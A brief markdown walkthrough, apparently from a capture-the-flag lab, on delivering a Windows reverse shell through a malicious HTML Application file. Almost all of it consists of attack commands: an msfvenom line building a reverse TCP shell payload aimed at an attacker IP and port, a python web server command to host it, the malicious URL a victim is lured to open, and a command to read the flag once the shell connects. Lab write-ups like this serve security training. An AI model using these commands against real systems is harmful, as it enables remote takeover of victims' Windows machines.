# HTA Exploit Execution

## Generating the Payload

To create an **HTA (HTML Application) exploit**, use `msfvenom` as follows:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.188.37 LPORT=9933 -f hta-psh -o thm.hta
```

This command generates an **HTA payload** that will execute a **reverse shell** when opened.

---

## Hosting the Payload

Once the payload is generated, host it using a web server. For example:

```bash
python3 -m http.server 666
```

This makes the **HTA file** accessible at:

```
http://10.10.188.37:666/thm.hta
```

---

## Exploiting the Target

When the victim visits the malicious URL:

```
http://10.10.188.37:666/thm.hta
```

The **HTA payload** is executed, establishing a **reverse shell** back to our attack machine.

---

## Accessing the Flag

Once the **reverse shell** is established, retrieve the flag:

```bash
type /Users/thm/Desktop/flag.txt
```